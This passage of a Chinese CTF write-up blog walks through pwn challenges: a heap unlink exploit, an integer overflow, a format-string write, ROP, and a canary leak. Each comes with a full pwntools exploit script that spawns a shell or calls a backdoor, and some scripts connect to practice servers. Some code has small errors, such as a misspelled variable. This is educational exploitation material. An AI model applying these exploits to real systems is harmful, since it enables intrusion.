<p>输入1是申请堆块，然后输入大小，这里注意有一个全局变量，每次申请的内存地址都存放在这个全局变量中</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213308210.png" alt="输入1的函数" style="zoom:67%;">
<p>输入2是编辑堆块，先输入目录号，然后输入长度，再输入内容</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213349366.png" alt="输入2的函数" style="zoom:67%;">
<p>输入3是进行free的操作</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213416269.png" alt="输入3的操作" style="zoom:67%;">
<p><strong>注意这里所有操作都是通过全局变量指针s来进行的</strong></p>
<h3 id="利用思路"><a class="markdownIt-Anchor" href="#利用思路"></a> 利用思路</h3>
<ol>
<li>
<p>首先创建4个堆块，3号堆块必须不是fastbin，不然不会向前合并，然后在2号堆块伪造chunk，令fd=chunk2的全局变量指针-0x18，bk= chunk2的全局变量指针-0x10</p>
</li>
<li>
<p>在第二个堆块中伪造fake chunk，然后free第三个堆块进行unlink，unlink操作会把伪造堆块的fd写入原来全局变量的chunk2的指针处。</p>
</li>
<li>
<p>这时候修改chunk2，因为chunk2的指针是就等于修改chunk2的全局变量指针-0x18处的值。</p>
</li>
<li>
<p>编辑chunk2（也就是chunk2的全局变量指针-0x18）开始编辑，把free的got表覆盖全局变量的chunk1指针处，然后通过编辑功能修改chunk1指针（也就是free的got表）为put的plt表，然后free掉chunk2，就可以泄露处put的真实地址，然后计算system和bin/sh的真实地址</p>
</li>
<li>
<p>最后把free的got表覆盖为system的地址，然后编辑chunk4中为/bin/sh的地址，然后free掉chunk4，触发system（/bin/sh）即可完成利用</p>
</li>
</ol>
<h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3>
<p>首先创建4个堆块，大小分别为0x20，0x30，0x80，0x20，堆块3不能是fastbin，否则不能触发合并。</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213459651.png" alt="创建堆快" style="zoom:67%;">
<p>查看全局变量s的位置，4个堆块的指针都记录在上面</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213531336.png" alt="全局变量查看" style="zoom:67%;">
<p>然后修改chunk2伪造堆块</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213556648.png" alt="伪造的chunk2" style="zoom:67%;">
<p>0是伪造堆块的prev_size，0x30是size</p>
<p>0x602138是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在伪造堆块的fd位置</p>
<p>0x602140是chunk2的全局变量指针-0x10(这里是0x612150-0x18)在位置堆块的bk位置</p>
<p>然后覆盖chunk3的prev_size为0x30，size为0x90，让系统以为伪造的堆块处于空闲状态</p>
<p>进行free（3）的操作后，判断伪造的chunk2是处于空闲状态，然后判断</p>
<p>p-&gt; fd-&gt; bk = = p 和 p-&gt; bk-&gt; fd ==p，这里p-&gt; fd=0x602138，然后从0x602138取4个地址偏移的位置（看成一个0x602138起始的堆块取bk），刚刚好是全局指针0x602150=&gt;0x2846460=p，验证通过，然后p-&gt; bk-&gt; fd ==p的过程同上。</p>
<p>然后进行unlink操作</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><code class="hljs c++">FD = p-&gt;fd;<br>BK = p-&gt;bk;<br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure>
<p>这里FD-&gt;bk和BK-&gt;fd都是chunk2在全局变量指针中的地址，最后会进行BK-&gt;fd = FD，把伪造chunk2的FD复制到chunk2全局变量指针的位置，结果如下</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213704244.png" alt="最后进行的BK->fd操作" style="zoom:67%;">
<p>可以看到0x602150（原来chunk2的指针位置）被覆盖成了伪造chunk2的FD（0x602138）</p>
<p>然后进行修改chunk2的操作（先从全局变量取指针0x602150-&gt;0x602138），然后就可以修改0x602138的位置的内容，这时把chunk1的全局变量指针改为free的got表地址，chunk2的全局变量指针改为put的plt表地址（用于put出put函数真实地址）</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213750481.png" alt="编辑chunk1" style="zoom:67%;">
<p>这里0x602148和0x602150已经被修改为free_got和put_plt</p>
<p>然后进行修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址</p>
<p>进行free（2）的操作，实际上是put出put_plt泄露出真实地址</p>
 <img src="/2021/04/15/unlink%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/image-20210415213836064.png" alt="泄露的put真实地址" style="zoom:67%;">
<p>后续操作就是计算system已经/bin/sh的地址了，最后同上修改free的got表地址为system的地址，修改chunk4为/bin/sh，进行free（4）的操作就可以了。</p>
<p>脚本如下，参考了https://bbs.pediy.com/thread-247007.htm</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br> <br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br> <br>context(log_level = <span class="hljs-string">&quot;debug&quot;</span>,os = <span class="hljs-string">&quot;linux&quot;</span>)<br><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">malloc</span>(<span class="hljs-params">size</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br> <br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,strings</span>):</span><br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(strings)))<br>    p.send(strings)<br>    p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br> <br>malloc(<span class="hljs-number">0x20</span>)<br>malloc(<span class="hljs-number">0x30</span>)<br>malloc(<span class="hljs-number">0x80</span>)<br>malloc(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#创建4个堆快，第三个用来free的堆快不能是fastbin</span><br><br>target = <span class="hljs-number">0x602140</span> + <span class="hljs-number">0x10</span><br>fd = target - <span class="hljs-number">0x18</span><br>bk = target - <span class="hljs-number">0x10</span><br><br>payload = p64(<span class="hljs-number">0</span>) <span class="hljs-comment">#伪造堆块的prev_size</span><br>payload += p64(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#伪造堆块的size</span><br>payload += p64(fd) + p64(bk)<br>payload += <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span><br>payload += p64(<span class="hljs-number">0x30</span>) + p64(<span class="hljs-number">0x90</span>)  <span class="hljs-comment">#更改chunk3的标志位，会认为前一个堆快是空闲的触发unlink</span><br>edit(<span class="hljs-number">2</span>,payload)<br><br>free(<span class="hljs-number">3</span>)<br>p.recvuntil(<span class="hljs-string">&quot;OK\n&quot;</span>)<br><br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br> <br>free_got = elf.got[<span class="hljs-string">&quot;free&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>payload2 = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x10</span> <br>payload2 += p64(free_got) + p64(puts_got)<br>edit(<span class="hljs-number">2</span>,payload2)<br><br>payload3 = p64(puts_plt)<br>edit(<span class="hljs-number">1</span>,payload3)<br><span class="hljs-comment">#修改chunk1的操作，就会从0x602148取指针（free_got）然后就可以把free的got表地址修改为put_got的地址 </span><br>free(<span class="hljs-number">2</span>)<br>puts_addr = u64(p.recvuntil(<span class="hljs-string">&quot;\nOK\n&quot;</span>,drop = <span class="hljs-literal">True</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>puts_offset = libc.symbols[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_offset = libc.symbols[<span class="hljs-string">&quot;system&quot;</span>]<br>binp_offset = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br> <br>libc_base = puts_addr - puts_offset<br> <br>system_addr = libc_base + system_offset<br> <br>payload4 = p64(system_addr)<br><br>edit(<span class="hljs-number">1</span>,payload4)<br><span class="hljs-comment">#再次修改chunk1，把free_got修改为system的地址</span><br><br>edit(<span class="hljs-number">4</span>,<span class="hljs-string">&quot;/bin/sh\00&quot;</span>)<br>free(<span class="hljs-number">4</span>)<br> <br>p.interactive()<br><br></code></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>PWN学习</category>
        <category>学习</category>
      </categories>
      <tags>
        <tag>PWN学习</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界刷题记录</title>
    <url>/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="攻防世界-pwn-int_overflow-整数溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-int_overflow-整数溢出"></a> 攻防世界-pwn-int_overflow-整数溢出</h1>
<p>1.先检查程序，没有开启canary和pie</p>
<p>​         <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101322876.png" alt="image-20210413101322876"></p>
<p>2.使用ida查看函数，main函数里会让你输入一个数字，当输入1时调用login()</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101524638.png" alt="image-20210413101524638"></p>
<p>查看login()函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101553522.png" alt="image-20210413101553522"></p>
<p>这里的第二个read函数读取的长度为0x199</p>
<p>然后再查看check_passwd函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101615917.png" alt="image-20210413101615917"></p>
<p>这里的v3是unsigned_int8型，存储8个字节，最多存储256个长度，这里可以进行整数溢出，下面的代码只要v3&gt;3或者v3&lt;8就可以通过验证，所以v3可以是259-264或者3-8个长度</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101639471.png" alt="image-20210413101639471"></p>
<p>3.继续观察函数，发现下面存在strcpy()函数存在栈溢出，但是&amp;dest的栈有14个字节，所以我们得让v3整数溢出通过上面的判断，然后在偏移为14+ebp的时候写入后门函数的地址</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101700572.png" alt="image-20210413101700572"></p>
<p>后门函数地址为0x0804868B</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413101715484.png" alt="image-20210413101715484"></p>
<p>所以编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>cat_flag=<span class="hljs-number">0x0804868B</span>  <span class="hljs-comment">#后门函数地址</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39309&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Your choice:&quot;</span>,<span class="hljs-string">&quot;1&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;Please input your username:\n&quot;</span>,<span class="hljs-string">&quot;2333&quot;</span>)<br>payload=<span class="hljs-string">&#x27;A&#x27;</span>*<span class="hljs-number">0x14</span>+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(cat_flag)+<span class="hljs-string">&#x27;A&#x27;</span>*(<span class="hljs-number">260</span>-<span class="hljs-number">0x14</span>-<span class="hljs-number">4</span>-<span class="hljs-number">4</span>)  <br><span class="hljs-comment">#&#x27;A&#x27;*0x14是到栈底的偏移量，&#x27;a&#x27;*4是ebp，最后填充的A需要补充长度到260才能导致整数溢出</span><br>p.sendlineafter(<span class="hljs-string">&quot;Please input your passwd:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-cgfsb-格式化字符串写入"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgfsb-格式化字符串写入"></a> 攻防世界-pwn-CGfsb-格式化字符串写入</h1>
<p>1.首先检查程序</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102120434.png" alt="image-20210413102120434"></p>
<p>32位程序，开启了canary保护和nx</p>
<p>2.用ida打开查看函数，发现其中有一个printf(&amp;s)存在明显的栈溢出</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102138548.png" alt="image-20210413102138548"></p>
<p>在第二次输入message时输入aaaa %p %p %p %p %p %p %p %p %p %p %p %p %p可以知道偏移为10</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102154558.png" alt="image-20210413102154558"></p>
<p>3.再次查看函数，里面有一段判断如果pwnme=8，则得到flag，所以我们可以用格式化字符串的漏洞覆盖pwnme的值</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102219355.png" alt="image-20210413102219355"></p>
<p>4.用ida查看pwnme的地址为0x0804A068，写出payload</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102248705.png" alt="image-20210413102248705"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;39393&#x27;</span>)<br>pwnme_addr=<span class="hljs-number">0x0804A068</span>         <span class="hljs-comment">#pwnme的地址</span><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name:\n&quot;</span>,<span class="hljs-string">&quot;abab&quot;</span>)<br>payload=p32(pwnme_adddr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+<span class="hljs-string">&#x27;%10$n&#x27;</span>    <br><span class="hljs-comment">#利用格式化字符串在pwnme的地址写入8，因为pwnme的地址占4字节，再补充4*a到8，就可以使pwnme的值为8</span><br>p.sendlineafter(<span class="hljs-string">&quot;leave your message please:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-cgpwn2-32位rop链构造"><a class="markdownIt-Anchor" href="#攻防世界-pwn-cgpwn2-32位rop链构造"></a> 攻防世界-pwn-cgpwn2-32位rop链构造</h1>
<p>1.先用checksec检查程序的保护</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102641981.png" alt="image-20210413102641981"></p>
<p>没有开启canary，然后使用ida查看代码，发现hello函数有一次存在栈溢出</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102711827.png" alt="image-20210413102711827"></p>
<p>并且发现name存在于bss中的地址是固定的0x0804A080</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102724230.png" alt="image-20210413102724230"></p>
<p>我们可以在name这个地方存储’/bin/sh’作为system的参数调用</p>
<p>Hello函数中存在一个get函数作为溢出点</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102741169.png" alt="image-20210413102741169"></p>
<p>离栈底为0x26</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413102759807.png" alt="image-20210413102759807"></p>
<p>这时可以编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&quot;debug&quot;</span><br>elf = ELF(<span class="hljs-string">&quot;./cgpwn2&quot;</span>)<br>p = remote(<span class="hljs-string">&#x27;220.249.52.134&#x27;</span>,<span class="hljs-string">&#x27;50628&#x27;</span>)<br><br>sys_addr=elf.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]   <span class="hljs-comment">#获取system的地址</span><br>name_addr=<span class="hljs-number">0x804a080</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;please tell me your name\n&quot;</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)   <span class="hljs-comment">#将/bin/sh写入name</span><br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x26</span>+<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>+p32(sys_addr)+<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(name_addr)     <span class="hljs-comment">#32位的程序rop链构造，name中存放的数据作为system的参数</span><br>p.sendlineafter(<span class="hljs-string">&quot;hello,you can leave some message here:\n&quot;</span>,payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-forgot-栈溢出"><a class="markdownIt-Anchor" href="#攻防世界-pwn-forgot-栈溢出"></a> 攻防世界 pwn-forgot-栈溢出</h1>
<ol>
<li>先检查程序，发现只开启了nx保护</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103114866.png" alt="image-20210413103114866"></p>
<ol start="2">
<li>观察函数发现scanf函数存在栈溢出。</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103154789.png" alt="image-20210413103154789"></p>
<p>再次观察其他函数发现存在一个后门函数可以直接拿到flag</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103221109.png" alt="image-20210413103221109"></p>
<p>先使用gdb进行调试，随便输入一些数据，发现最后返回的在ida里地址为0x80486CC的函数，在主函数中定义为v4</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103238325.png" alt="image-20210413103238325"></p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103251099.png" alt="image-20210413103251099"></p>
<p>观察ida里其他函数，发现一个后门函数，地址为0x80486CC考虑使用栈溢出去执行它</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103303074.png" alt="image-20210413103303074"></p>
<p>在ida中查看栈空间可知，v4函数距离scantf输入的变量v2的偏移量为0x24</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103429828.png" alt="image-20210413103429828"></p>
<p>编写payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">33397</span>)<br>backaddr=<span class="hljs-number">0x80486CC</span>     <span class="hljs-comment">#后门函数地址</span><br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;text&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&quot;</span>)<br>payload=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x24</span>+p32(backaddr)     <span class="hljs-comment">#覆盖v4的地址为后门函数</span><br>p.sendline(payload)<br>p.interactive()	<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-mary_morton-格式化字符串泄露canary"><a class="markdownIt-Anchor" href="#攻防世界-pwn-mary_morton-格式化字符串泄露canary"></a> 攻防世界 pwn-Mary_Morton-格式化字符串泄露canary</h1>
<ol>
<li>先查看程序，发现没有开启地址随机化</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103823331.png" alt="image-20210413103823331"></p>
<ol start="2">
<li>进行调试，发现程序让你会让你选择漏洞</li>
</ol>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103844363.png" alt="image-20210413103844363"></p>
<ol start="3">
<li>用ida打开程序，发现在选择格式化字符串（2）的时候会调用一个printf函数，存在格式化字符串漏洞</li>
</ol>
<p>主函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103904120.png" alt="image-20210413103904120"></p>
<p>函数sub_4008EB</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103919834.png" alt="image-20210413103919834"></p>
<p>由于程序开启了canary保护，所以得先通过格式化字符串泄露出canary的值，才能覆盖返回地址达到开启后门函数的目的。</p>
<p>查看栈空间，发现canary的值距离buf的位置是0x90-0x8=0x88，该程序是64位程序，一个格式化字符串占8字节，0x88/8=17，再通过格式化字符串判断偏移量</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103935012.png" alt="image-20210413103935012"></p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413103953632.png" alt="image-20210413103953632"></p>
<p>4.测试字符串的偏移，输入aaaa %p %p %p %p %p %p %p %p %p</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104113264.png" alt="image-20210413104113264"></p>
<p>根据回显可以知道偏移为6所以buf到var_8偏移为17+6=23</p>
<p>5.观察其他函数，发现有一个后门函数可以得到flag，地址为0x4008DA</p>
<p>​     <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104124884.png" alt="image-20210413104124884"></p>
<p>6.思路为先通过格式化字符串得到canary的值，然后再通过栈溢出去执行后门函数，得到flag，所以编写payload为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.binary=<span class="hljs-string">&#x27;Mary_Morton&#x27;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#io=process(&#x27;./Mary_Morton&#x27;)</span><br>io = remote(<span class="hljs-string">&quot;220.249.52.133&quot;</span>, <span class="hljs-number">45232</span>)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.recvuntil(<span class="hljs-string">&quot;3. Exit the battle \n&quot;</span>)<br>io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>catflag=<span class="hljs-number">0x4008DA</span>        <span class="hljs-comment">#后门函数的地址</span><br>payload = <span class="hljs-string">&quot;%23$p&quot;</span>       <span class="hljs-comment">#buf距离canary值的偏移为23</span><br>io.sendline(payload)<br>Canary=<span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">&quot;00&quot;</span>),<span class="hljs-number">16</span>)   <span class="hljs-comment">#得到canary的值</span><br>log.info(<span class="hljs-string">&quot;Canary:&quot;</span>+<span class="hljs-built_in">hex</span>(Canary))<br>io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>payload = <span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x88</span>+p64(Canary)+<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">8</span>+p64(catflag)<br>io.send(payload)<br><span class="hljs-built_in">print</span> io.recvall()<br></code></pre></td></tr></table></figure>
<h1 id="攻防世界-pwn-dice_game"><a class="markdownIt-Anchor" href="#攻防世界-pwn-dice_game"></a> 攻防世界 pwn-dice_game</h1>
<p>1.先检查程序有没有存在栈溢出</p>
<p>​        <img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104229973.png" alt="image-20210413104229973"></p>
<p>发现不存在canary保护，可能进行栈溢出的操作。</p>
<p>2.使用ida进行分析</p>
<p>主函数：</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104245282.png" alt="image-20210413104245282"></p>
<p>sub_A20()函数</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104308863.png" alt="image-20210413104308863"></p>
<p>经过分析可知，该程序的目的是对比输入的数字与随机生成的种子seed[]生成的随机数对6求余再加1进行对比，如果正确50次则通过。</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413104331604.png" alt="image-20210413104331604"></p>
<p>通过查看地址可以知道当输入名字buf时，可以通过偏移覆盖到seed，偏移量为0x40</p>
<p>注：关于rand()和srand()随机函数:这两个函数生成的随机数实际上是一段数字的循环，这些数字取决于随机种子。在调用rand（）函数时，必须先利用srand()设好的随机数种子，如果未设随机数种子，rand()在调用时会自动设随机数种子为1。</p>
<p>所以只要控制随机数生成的种子seed，就可以预测生成的随机数，需要利用题目提供的库libc.so.6</p>
<p>Payload脚本</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/C:%5CUsers%5C17473%5CDesktop%5C%E7%BD%91%E5%AE%89%E5%AE%9E%E9%AA%8C%5Cmakedown%5Cimage-20210413104657091.png" alt="image-20210413104657091"></p>
<h1 id="攻防世界-pwn-stack2"><a class="markdownIt-Anchor" href="#攻防世界-pwn-stack2"></a> 攻防世界 pwn-stack2</h1>
<p>1.先检查程序的保护</p>
<p><img src="/2020/12/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20210413105116926.png" alt="image-20210413105116926"></p>
<p>发现程序没有开启地址随机化，但是开启了canary保护</p>
<p>2.用ida观察函数，发现其中存在数组越界导致的栈溢出。</p>
 <img src="\12.png" alt="12" style="zoom:67%;">
<p>其中v5,v7都是我们可输入的数值，但是在赋值给数组时没有检查数组越界而导致了栈溢出</p>
